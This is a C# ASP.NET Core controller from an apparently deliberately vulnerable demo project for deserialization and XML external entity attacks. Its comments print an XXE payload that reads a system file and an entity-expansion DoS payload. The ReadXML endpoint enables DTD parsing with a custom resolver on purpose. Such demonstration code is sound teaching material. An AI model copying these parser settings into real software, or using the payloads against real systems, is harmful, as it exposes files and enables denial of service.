using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using VulnerableDeserialization.Helpers;
using VulnerableDeserialization.Models;

namespace VulnerableDeserialization.Controllers
{
    [ApiController]
    [Route("[controller]/[action]")]
    public class ApiController : ControllerBase
    {
        /// <summary>
        /// Calling this endpoint will mark appsettings.json as read-only
        /// </summary>
        /// <remarks>
        ///  By default .NET Core is not vulnerable to this attack.
        ///  Works only if options.SerializerSettings.TypeNameHandling = TypeNameHandling.All added to startup.cs  
        /// </remarks>
        /// <param name="param"></param>
        /// <response code="200">Just returns Ok</response>
        [HttpPost]
        public IActionResult Deserialize([FromBody] SomeDummyObject param)
        {

            return Ok();
        }

        // XXE demo
        /*
          By default .NET Core is not vulnerable to this attack
        
        <?xml version = "1.0" ?>
        <!DOCTYPE foo[  < !ELEMENT foo ANY>
        <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
        <foo>&xxe;</foo>
        */

        // or DoS attack
        /*
        <?xml version = "1.0" ?>
        <!DOCTYPE data[
        <!ENTITY a0 "dos" >
        <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
        <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
        ]>
        <data>&a2;</data>
        */

        [HttpPost]
        public async Task<IActionResult> ReadXML()
        {
            var xml = "";
            using (StreamReader streamReader = new StreamReader(Request.Body, Encoding.UTF8))
            {
                xml = await streamReader.ReadToEndAsync();
            }

            XmlReaderSettings settings = new XmlReaderSettings();
            // for DoS attack that's enough to let parsing
            settings.DtdProcessing = DtdProcessing.Parse;
            // if you need parsing and want to be protected from DoS use
            settings.MaxCharactersFromEntities = 1000; // by default is 10000000

            // That's really very dangerous because allows to get any file content
            settings.XmlResolver = new CustomXmlResolver();

            XmlReader reader = XmlReader.Create(new StringReader(xml), settings);

            while (reader.Read())
            {
                Debug.WriteLine(reader.Value);
            }

            return Ok();
        }

    }
}
